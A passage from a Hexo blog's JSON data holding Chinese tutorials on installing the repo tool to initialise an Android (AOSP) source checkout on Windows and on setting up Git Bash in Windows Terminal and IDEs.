icons什么的，即添加桌面图标，默认没勾，最好勾上。</li>\n<li>最后一步有3个Enable xxx，默认第3个（和symbollink相关）没勾，请把它勾上。</li>\n</ul>\n<h4 id=\"二、安装Python-2-7\"><a href=\"#二、安装Python-2-7\" class=\"headerlink\" title=\"二、安装Python 2.7\"></a>二、安装Python 2.7</h4><p> 先到官网（<a href=\"https://www.python.org/downloads/release/python-2717/\">https://www.python.org/downloads/release/python-2717/</a>）下载 <strong>Windows x86-64 MSI installer</strong> ，这貌似是Python 2时代的最后一个版本了。安装一路下一步即可。</p>\n<h4 id=\"三、配置系统环境变量\"><a href=\"#三、配置系统环境变量\" class=\"headerlink\" title=\"三、配置系统环境变量\"></a>三、配置系统环境变量</h4><p>上述俩基础组件装完了，检查一下环境变量，Path路径该加的加上，Windows如何查看并添加系统环境变量请大家自行搜索。需要添加如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Program Files\\Git\\cmd</span><br><span class=\"line\">C:\\Program Files\\Git\\bin</span><br><span class=\"line\">C:\\Program Files\\Git\\usr\\bin</span><br><span class=\"line\">C:\\Python27\\</span><br><span class=\"line\">C:\\Python27\\Scripts\\</span><br><span class=\"line\"><span class=\"comment\"># 这一项不要忘了，先提前配置好，为repo做准备</span></span><br><span class=\"line\">C:\\Users\\你的用户名\\bin</span><br></pre></td></tr></table></figure>\n<p>路径和你安装时的选择相关，切勿直接照抄。还是给大家整个图吧。<br><img src=\"https://imgconvert.csdnimg.cn/20200205214724901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"四、安装repo\"><a href=\"#四、安装repo\" class=\"headerlink\" title=\"四、安装repo\"></a>四、安装repo</h4><p>repo原本是谷歌搞的一个方便下载AOSP的工具，基于git，但由于种种原因，不能直接在Windows上使用。但<strong>好心的基佬Hub网友开发了一套改良版的repo</strong>，适用于Windows，解决各种Error问题。</p>\n<p>首先要把repo命令脚本搞定。在任意处打开 <strong>Git Bash</strong> （点桌面的快捷方式也可以），然后：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/bin</span><br><span class=\"line\">curl https://raw.githubusercontent.com/esrlabs/git-repo/stable/repo &gt; ~/bin/repo</span><br><span class=\"line\">curl https://raw.githubusercontent.com/esrlabs/git-repo/stable/repo.cmd &gt; ~/bin/repo.cmd</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> a+rx ~/bin/repo</span><br></pre></td></tr></table></figure>\n<p>接下来，基本上就和Linux上的操作差不多了。但在repo init时，需要增加或修改 <strong>repo-url</strong> 参数，具体如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 先随便新建源码目录</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/AOSP</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/AOSP</span><br><span class=\"line\"><span class=\"comment\"># 初始化</span></span><br><span class=\"line\">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25 --repo-url=https://github.com/esrlabs/git-repo.git</span><br></pre></td></tr></table></figure>\n<p><strong>注意点：</strong></p>\n<ul>\n<li>上述命令关键就在 <code>--repo-url=https://github.com/esrlabs/git-repo.git</code> ，替换掉原生的repo工具链，就能成功初始化了。</li>\n<li>这里用的是清华镜像源AOSP作示例，一般做ROM开发的公司会有自己的仓库地址，请自行修改init链接。</li>\n<li>不要忘了生成ssh的public key，在Windows下也一样：在Git Bash中执行 <code>ssh-keygen</code> 然后复制 <code>~/.ssh/id_rsa.pub</code> 文件中的内容添加到Gerrit等源码平台上即可。<br><img src=\"https://imgconvert.csdnimg.cn/20200205222055923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></li>\n<li>如果发现上面下载速度太慢，可以把 <a href=\"https://github.com/esrlabs/git-repo\">https://github.com/esrlabs/git-repo</a> 项目直接下载下来并解压，复制解压后文件夹中的所有文件到源码目录的的 <code>.repo/repo</code> 子目录下面，然后再重新执行repo init命令，当然这次就不要带 <strong>repo-url</strong> 参数了。<br><img src=\"https://imgconvert.csdnimg.cn/20200205221541817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>大功告成！<br><img src=\"https://imgconvert.csdnimg.cn/20200205222000447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></li>\n</ul>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li><a href=\"https://github.com/esrlabs/git-repo\">git-repo</a></li>\n<li><a href=\"https://gerrit.googlesource.com/git-repo/+/HEAD/docs/windows.md\">Microsoft Windows Details</a></li>\n<li><a href=\"https://ressrc.com/2018/09/22/windows%E7%8E%AF%E5%A2%83%E4%B8%8Brepo%E4%B8%8B%E8%BD%BDandroid%E6%BA%90%E4%BB%A3%E7%A0%81/\">windows环境下repo下载Android源代码</a></li>\n<li><a href=\"https://blog.csdn.net/nicolelili1/article/details/52527475\">window7下配置下载android源码环境,安装Repo</a></li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>2020-02-22更新！我发现谷歌在最近几天发布了git-repo 2.4版本，并更新了 <a href=\"https://gerrit.googlesource.com/git-repo/+/HEAD/docs/windows.md\">Microsoft Windows Details</a> 文档，直接解决了此文问题，比本文以前的三方解决办法简单很多很多。</p>\n</blockquote>\n<h3 id=\"最新官方解决方案\"><a href=\"#最新官方解决方案\" class=\"headerlink\" title=\"最新官方解决方案\"></a>最新官方解决方案</h3><h4 id=\"一、基础设施\"><a href=\"#一、基础设施\" class=\"headerlink\" title=\"一、基础设施\"></a>一、基础设施</h4><ul>\n<li>安装最新的Git for Windows（参考下面的旧文即可），目前版本是2.25.1</li>\n<li><strong>安装Python 3</strong> ，目前版本是3.8.1，<strong>不要安装Python 2</strong>，这是和旧办法的不同之处</li>\n<li>配置各种环境变量（参照旧文即可），Python 3在安装的时候勾选Add path那项就能自动配置</li>\n</ul>\n<h4 id=\"二、搞起最新的repo工具\"><a href=\"#二、搞起最新的repo工具\" class=\"headerlink\" title=\"二、搞起最新的repo工具\"></a>二、搞起最新的repo工具</h4><p>和旧文的<strong>安装Repo</strong>步骤类似，只不过所有都替换成谷歌官方的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/bin</span><br><span class=\"line\">curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> a+rx ~/bin/repo</span><br></pre></td></tr></table></figure>\n<p>然后<strong>注意</strong>，先下载最新的repo工具源码，再进行init操作：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 先随便新建源码目录</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p ~/AOSP/.repo</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/AOSP/.repo</span><br><span class=\"line\"><span class=\"comment\"># clone工具集</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://gerrit.googlesource.com/git-repo</span><br><span class=\"line\"><span class=\"comment\"># 一定要改文件夹名</span></span><br><span class=\"line\"><span class=\"built_in\">mv</span> git-repo repo</span><br><span class=\"line\"><span class=\"comment\"># 回到AOSP源码目录</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br><span class=\"line\"><span class=\"comment\"># 保证你成功</span></span><br><span class=\"line\">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25 --worktree</span><br></pre></td></tr></table></figure>\n<p>这里的 <code>--worktree</code> 参数非常重要，不加的话会出现 <strong>error.GitError: Cannot initialize work tree for manifests</strong> 错误。这个功能也是谷歌在这个月底才更新的。<br><img src=\"https://imgconvert.csdnimg.cn/20200222214938843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>最终我也试了下repo sync，repo upload等命令均无问题。</p>\n<hr>\n<blockquote>\n<p>以下是旧文，强烈推荐分隔线以上的最新官方解决方案。</p>\n</blockquote>\n<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>2020真是魔幻的一年，受疫情影响，大家年后一段时间都远程办公了。奈何很多同事在家没有Linux开发环境，想在Windows上通过repo工具下载Android源码简直比登天还难。</p>\n<p>网上搜来受去没几个讲透彻的，今天给大家整活。按下面步骤来，保证OK，我们最终以 <strong>repo init</strong> 执行成功为目标。</p>\n<h3 id=\"走起\"><a href=\"#走起\" class=\"headerlink\" title=\"走起\"></a>走起</h3><h4 id=\"一、安装Git-for-Windows\"><a href=\"#一、安装Git-for-Windows\" class=\"headerlink\" title=\"一、安装Git for Windows\"></a>一、安装Git for Windows</h4><p>先到官网（<a href=\"https://git-scm.com/download/win\">https://git-scm.com/download/win</a>）下载 <strong>64-bit Git for Windows Setup</strong> 然后安装，基本上一路下一步，但需要注意几点：</p>\n<ul>\n<li>第一步第一项有个Add icons什么的，即添加桌面图标，默认没勾，最好勾上。</li>\n<li>最后一步有3个Enable xxx，默认第3个（和symbollink相关）没勾，请把它勾上。</li>\n</ul>\n<h4 id=\"二、安装Python-2-7\"><a href=\"#二、安装Python-2-7\" class=\"headerlink\" title=\"二、安装Python 2.7\"></a>二、安装Python 2.7</h4><p> 先到官网（<a href=\"https://www.python.org/downloads/release/python-2717/\">https://www.python.org/downloads/release/python-2717/</a>）下载 <strong>Windows x86-64 MSI installer</strong> ，这貌似是Python 2时代的最后一个版本了。安装一路下一步即可。</p>\n<h4 id=\"三、配置系统环境变量\"><a href=\"#三、配置系统环境变量\" class=\"headerlink\" title=\"三、配置系统环境变量\"></a>三、配置系统环境变量</h4><p>上述俩基础组件装完了，检查一下环境变量，Path路径该加的加上，Windows如何查看并添加系统环境变量请大家自行搜索。需要添加如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Program Files\\Git\\cmd</span><br><span class=\"line\">C:\\Program Files\\Git\\bin</span><br><span class=\"line\">C:\\Program Files\\Git\\usr\\bin</span><br><span class=\"line\">C:\\Python27\\</span><br><span class=\"line\">C:\\Python27\\Scripts\\</span><br><span class=\"line\"><span class=\"comment\"># 这一项不要忘了，先提前配置好，为repo做准备</span></span><br><span class=\"line\">C:\\Users\\你的用户名\\bin</span><br></pre></td></tr></table></figure>\n<p>路径和你安装时的选择相关，切勿直接照抄。还是给大家整个图吧。<br><img src=\"https://imgconvert.csdnimg.cn/20200205214724901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"四、安装repo\"><a href=\"#四、安装repo\" class=\"headerlink\" title=\"四、安装repo\"></a>四、安装repo</h4><p>repo原本是谷歌搞的一个方便下载AOSP的工具，基于git，但由于种种原因，不能直接在Windows上使用。但<strong>好心的基佬Hub网友开发了一套改良版的repo</strong>，适用于Windows，解决各种Error问题。</p>\n<p>首先要把repo命令脚本搞定。在任意处打开 <strong>Git Bash</strong> （点桌面的快捷方式也可以），然后：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/bin</span><br><span class=\"line\">curl https://raw.githubusercontent.com/esrlabs/git-repo/stable/repo &gt; ~/bin/repo</span><br><span class=\"line\">curl https://raw.githubusercontent.com/esrlabs/git-repo/stable/repo.cmd &gt; ~/bin/repo.cmd</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> a+rx ~/bin/repo</span><br></pre></td></tr></table></figure>\n<p>接下来，基本上就和Linux上的操作差不多了。但在repo init时，需要增加或修改 <strong>repo-url</strong> 参数，具体如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 先随便新建源码目录</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/AOSP</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/AOSP</span><br><span class=\"line\"><span class=\"comment\"># 初始化</span></span><br><span class=\"line\">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25 --repo-url=https://github.com/esrlabs/git-repo.git</span><br></pre></td></tr></table></figure>\n<p><strong>注意点：</strong></p>\n<ul>\n<li>上述命令关键就在 <code>--repo-url=https://github.com/esrlabs/git-repo.git</code> ，替换掉原生的repo工具链，就能成功初始化了。</li>\n<li>这里用的是清华镜像源AOSP作示例，一般做ROM开发的公司会有自己的仓库地址，请自行修改init链接。</li>\n<li>不要忘了生成ssh的public key，在Windows下也一样：在Git Bash中执行 <code>ssh-keygen</code> 然后复制 <code>~/.ssh/id_rsa.pub</code> 文件中的内容添加到Gerrit等源码平台上即可。<br><img src=\"https://imgconvert.csdnimg.cn/20200205222055923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></li>\n<li>如果发现上面下载速度太慢，可以把 <a href=\"https://github.com/esrlabs/git-repo\">https://github.com/esrlabs/git-repo</a> 项目直接下载下来并解压，复制解压后文件夹中的所有文件到源码目录的的 <code>.repo/repo</code> 子目录下面，然后再重新执行repo init命令，当然这次就不要带 <strong>repo-url</strong> 参数了。<br><img src=\"https://imgconvert.csdnimg.cn/20200205221541817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>大功告成！<br><img src=\"https://imgconvert.csdnimg.cn/20200205222000447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></li>\n</ul>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li><a href=\"https://github.com/esrlabs/git-repo\">git-repo</a></li>\n<li><a href=\"https://gerrit.googlesource.com/git-repo/+/HEAD/docs/windows.md\">Microsoft Windows Details</a></li>\n<li><a href=\"https://ressrc.com/2018/09/22/windows%E7%8E%AF%E5%A2%83%E4%B8%8Brepo%E4%B8%8B%E8%BD%BDandroid%E6%BA%90%E4%BB%A3%E7%A0%81/\">windows环境下repo下载Android源代码</a></li>\n<li><a href=\"https://blog.csdn.net/nicolelili1/article/details/52527475\">window7下配置下载android源码环境,安装Repo</a></li>\n</ul>\n"},{"layout":"post","title":"Win10也要愉快地使用Bash","subtitle":"世界那么大。","date":"2020-02-23T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n对于习惯了Linux和Mac的同学来说，Windows自带的终端确实不太好用。其实我们完全可以用Bash取而代之。\n\n### 安装Windows Terminal\n\n自从巨硬拥抱开源之后，那是骚操作频频。Windows Terminal是一个开源项目，它本身只是一个终端容器，可以装载系统自带的CMD、PowerShell甚至是WSL子系统的终端。\n\n下载安装很简单，可以在应用商店直接搜索Terminal安装，也可以去GitHub上下载安装包：[https://github.com/microsoft/terminal/releases](https://github.com/microsoft/terminal/releases)\n\n**注：**需要Win10版本不小于1903。Win+R打开“运行”输入 `winver` 命令即可查看系统版本。\n\n### 安装Git for Windows\n\n先到官网（[https://git-scm.com/download/win](https://git-scm.com/download/win)）下载 **64-bit Git for Windows Setup** 然后安装，基本上一路下一步，但需要注意几点最后一步有3个Enable xxx，默认第3个（和symbollink相关）没勾，请把它勾上。\n\n安装Git主要是为了它附送的Git Bash，这是本文的主角。装好后注意配置一下环境变量Path，把这几个都加上：\n\n```bash\n# 具体路径以你安装时的选择为准\nC:\\Program Files\\Git\\cmd\nC:\\Program Files\\Git\\bin\nC:\\Program Files\\Git\\usr\\bin\n```\n\n### 把Git Bash添加到Windows Terminal中\n\n打开Terminal，在顶部可以找到Settings设置选项：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200224173143173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n所有设置都在一个json文件中，配置起来相当灵活，我们可以看到其中有一个list数组，对应的就是现有的终端，接下来我们在数组首位插入一段关于Git Bash的配置：\n\n```json\n\"list\":\n[\n    {\n        \"acrylicOpacity\" : 0.75, // 窗口透明度\n        \"closeOnExit\" : true, // 关闭Terminal是否退出bash\n        \"colorScheme\" : \"Campbell\", // 颜色主题\n        \"commandline\" : \"bash.exe\", // Git Bash的相对路径，因为你配置了环境变量所以不用写绝对路径\n        \"cursorColor\" : \"#FFFFFF\", // 光标颜色\n        \"cursorShape\" : \"bar\", // 光标样式\n        \"fontFace\" : \"JetBrains Mono\", // 字体，必须是系统中已安装的字体\n        \"fontSize\" : 11,\n        \"guid\" : \"{0caa0dad-35be-5f56-a8ff-afceeeaa6109}\", // 该终端的唯一id，一定要和list中其他项不同\n        \"historySize\" : 9001,\n        \"icon\" : \"C:\\\\Git\\\\gwindows_logo.png\", // Terminal标签页上的图标，自己随便找个都行\n        \"name\" : \"git-bash\", // 标签页上的标题\n        \"padding\" : \"0, 0, 0, 0\", // 终端内容内边距\n        \"snapOnInput\" : true,\n        \"startingDirectory\" : \"%USERPROFILE%\", // 每次打开的初始目录\n        \"useAcrylic\" : true\n    },\n    {\n        // Make changes here to the powershell.exe profile\n        ...\n    },\n    {\n        // Make changes here to the cmd.exe profile\n        ...\n    },\n    {\n        ...\n    },\n    {\n        ...\n    }\n]\n```\n\n然后把你自己瞎编的那一串guid替换本json文件上方的 `defaultProfile` 字段，这样你每次打开Windows Terminal时就会默认启动Git Bash了。有人会问怎么编guid，你可以复制已经有的，然后改一下末尾数字：\n\n```json\n\"defaultProfile\": \"{0caa0dad-35be-5f56-a8ff-afceeeaa6109}\"\n```\n\n搞定了就：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020022417543044.png)\n\n### 解决中文无法显示的问题\n\n打开Git安装目录下的 **C:\\Git\\etc\\bash.bashrc** （具体路径以你安装的为准）文件，在末尾追加一行：\n\n```bash\nexport LC_ALL=en_US.UTF-8\n```\n\n并保存，重启终端就好了。\n\n### 将Bash集成到IDEA（或Android Studio）等JB全家桶中\n\n有些同学可以习惯于使用IDE内部的Terminal，这样就不用切来切去。很简单其实，左上角File，然后Settings，找到Terminal这一项设置，把原来的cmd.exe改成sh的全路径即可：`\"C:\\Git\\bin\\sh.exe\" -login -i`\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020022418013520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n### 如何从任意文件夹目录下启动Bash\n\n我们都知道Ubuntu这种Linux发行版都有在文件夹空白处鼠标右键打开终端的功能，这个很方便，不用手动cd。其实Windows也可以的。需要手动配置一下注册表，具体可以直接参考：[新发布的Windows Terminal如何添加到右键菜单？](https://www.zhihu.com/question/325948326)\n\n当然，如果不想修改这些的话，我们也可以在资源管理器的地址栏中输入wt，同样能打开。快速锁定地址栏焦点的快捷键是 `Ctrl + L` ，和鼠标单击效果一样：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200226163354171.png)\n\n然后输入 **wt** 再回车就打开啦：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020022616355223.png)\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020022616364753.png)\n\n### Bash记不住history怎么办\n\n使用过程中会发现，直接关闭Windows Terminal是不会记住bash历史记录的，但如果通过 `exit` 命令来退出就可以。不过这样每次都输入命令太麻烦了。没关系，有[解决办法](https://felixc.at/2013/09/how-to-avoid-losing-any-history-lines/)，很简单！\n\n打开Git安装目录下的 **C:\\Git\\etc\\bash.bashrc** （具体路径以你安装的为准）文件，在末尾追加内容：\n\n```bash\nHISTFILESIZE=400000000\nHISTSIZE=10000\nPROMPT_COMMAND=\"history -a\"\nexport HISTSIZE PROMPT_COMMAND\nshopt -s histappend\n```\n\n### 题外话\n\n本文正文已经结束啦！这里给大家安利一个Windows上的小工具。我发现Windows没有类似Linux和Mac上的同应用间切换的快捷键，即 `Alt + ~` ，在打开很多相同程序的窗口时，如果仅仅是用Win自带的 `Alt + Tab` 实在是太麻烦了。\n\n恰好这个古董小软件居然还能用在Win10上：[Easy Window Switcher](https://neosmart.net/EasySwitch/)\n\n还有上面提到的JetBrains官方字体（免费），也不错的，推荐给大家：[JetBrains Mono](https://www.jetbrains.com/lp/mono/#how-to-install)\n","source":"_posts/2020-02-24-Win10也要愉快地使用Bash.md","raw":"---\nlayout:     post\ntitle:      Win10也要愉快地使用Bash\nsubtitle:   世界那么大。\ndate:       2020-02-24\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Windows\n---\n\n对于习惯了Linux和Mac的同学来说，Windows自带的终端确实不太好用。其实我们完全可以用Bash取而代之。\n\n### 安装Windows Terminal\n\n自从巨硬拥抱开源之后，那是骚操作频频。Windows Terminal是一个开源项目，它本身只是一个终端容器，可以装载系统自带的CMD、PowerShell甚至是WSL子系统的终端。\n\n下载安装很简单，可以在应用商店直接搜索Terminal安装，也可以去GitHub上下载安装包：[https://github.com/microsoft/terminal/releases](https://github.com/microsoft/terminal/releases)\n\n**注：**需要Win10版本不小于1903。Win+R打开“运行”输入 `winver` 命令即可查看系统版本。\n\n### 安装Git for Windows\n\n先到官网（[https://git-scm.com/download/win](https://git-scm.com/download/win)）下载 **64-bit Git for Windows Setup** 然后安装，基本上一路下一步，但需要注意几点最后一步有3个Enable xxx，默认第3个（和symbollink相关）没勾，请把它勾上。\n\n安装Git主要是为了它附送的Git Bash，这是本文的主角。装好后注意配置一下环境变量Path，把这几个都加上：\n\n```bash\n# 具体路径以你安装时的选择为准\nC:\\Program Files\\Git\\cmd\nC:\\Program Files\\Git\\bin\nC:\\Program Files\\Git\\usr\\bin\n```\n\n### 把Git Bash添加到Windows Terminal中\n\n打开Terminal，在顶部可以找到Settings设置选项：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200224173143173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n所有设置都在一个json文件中，配置起来相当灵活，我们可以看到其中有一个list数组，对应的就是现有的终端，接下来我们在数组首位插入一段关于Git Bash的配置：\n\n```json\n\"list\":\n[\n    {\n        \"acrylicOpacity\" : 0.75, // 窗口透明度\n        \"closeOnExit\" : true, // 关闭Terminal是否退出bash\n        \"colorScheme\" : \"Campbell\", // 颜色主题\n        \"commandline\" : \"bash.exe\", // Git Bash的相对路径，因为你配置了环境变量所以不用写绝对路径\n        \"cursorColor\" : \"#FFFFFF\", // 光标颜色\n        \"cursorShape\" : \"bar\", // 光标样式\n        \"fontFace\" : \"JetBrains Mono\", // 字体，必须是系统中已安装的字体\n        \"fontSize\" : 11,\n        \"guid\" : \"{0caa0dad-35be-5f56-a8ff-afceeeaa6109}\", // 该终端的唯一id，一定要和list中其他项不同\n        \"historySize\" : 9001,\n        \"icon\" : \"C:\\\\Git\\\\gwindows_logo.png\", // Terminal标签页上的图标，自己随便找个都行\n        \"name\" : \"git-bash\", // 标签页上的标题\n        \"padding\" : \"0, 0, 0, 0\", // 终端内容内边距\n        \"snapOnInput\" : true,\n        \"startingDirectory\" : \"%USERPROFILE%\", // 每次打开的初始目录\n        \"useAcrylic\" : true\n    },\n    {\n        // Make changes here to the powershell.exe profile\n        ...\n    },\n    {\n        // Make changes here to the cmd.exe profile\n        ...\n    },\n    {\n        ...\n    },\n    {\n        ...\n    }\n]\n```\n\n然后把你自己瞎编的那一串guid替换本json文件上方的 `defaultProfile` 字段，这样你每次打开Windows Terminal时就会默认启动Git Bash了。有人会问怎么编guid，你可以复制已经有的，然后改一下末尾数字：\n\n```json\n\"defaultProfile\": \"{0caa0dad-35be-5f56-a8ff-afceeeaa6109}\"\n```\n\n搞定了就：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020022417543044.png)\n\n### 解决中文无法显示的问题\n\n打开Git安装目录下的 **C:\\Git\\etc\\bash.bashrc** （具体路径以你安装的为准）文件，在末尾追加一行：\n\n```bash\nexport LC_ALL=en_US.UTF-8\n```\n\n并保存，重启终端就好了。\n\n### 将Bash集成到IDEA（或Android Studio）等JB全家桶中\n\n有些同学可以习惯于使用IDE内部的Terminal，这样就不用切来切去。很简单其实，左上角File，然后Settings，找到Terminal这一项设置，把原来的cmd.exe改成sh的全路径即可：`\"C:\\Git\\bin\\sh.exe\" -login -i`\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020022418013520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n### 如何从任意文件夹目录下启动Bash\n\n我们都知道Ubuntu这种Linux发行版都有在文件夹空白处鼠标右键打开终端的功能，这个很方便，不用手动cd。其实Windows也可以的。需要手动配置一下注册表，具体可以直接参考：[新发布的Windows Terminal如何添加到右键菜单？](https://www.zhihu.com/question/325948326)\n\n当然，如果不想修改这些的话，我们也可以在资源管理器的地址栏中输入wt，同样能打开。快速锁定地址栏焦点的快捷键是 `Ctrl + L` ，和鼠标单击效果一样：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200226163354171.png)\n\n然后输入 **wt** 再回车就打开啦：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020022616355223.png)\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020022616364753.png)\n\n### Bash记不住history怎么办\n\n使用过程中会发现，直接关闭Windows Terminal是不会记住bash历史记录的，但如果通过 `exit` 